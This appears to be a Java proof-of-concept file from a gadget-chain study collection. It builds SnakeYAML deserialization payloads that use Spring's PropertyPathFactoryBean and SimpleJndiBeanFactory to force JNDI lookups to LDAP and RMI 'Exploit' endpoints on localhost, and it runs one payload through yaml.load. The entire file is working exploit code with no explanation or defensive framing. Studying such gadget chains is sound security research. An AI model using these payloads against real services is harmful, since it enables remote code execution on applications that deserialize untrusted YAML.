package AvailableGadgets;

import org.yaml.snakeyaml.Yaml;

// Spring PropertyPathFactoryBean EXP
public class SpringPropertyPathFactoryBeanEXP {
    public static void main(String[] args) {
        String payload = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n" +
                " targetBeanName: \"ldap://localhost:1389/Exploit\"\n" +
                " propertyPath: Drunkbaby\n" +
                " beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n" +
                "  shareableResources: [\"ldap://localhost:1389/Exploit\"]";

        String poc = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n" +
                " targetBeanName: \"rmi://127.0.0.1:1099/Exploit\"\n" +
                " propertyPath: Drunkbaby\n" +
                " beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n" +
                "  shareableResources: [\"rmi://127.0.0.1:1099/Exploit\"]";

        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}
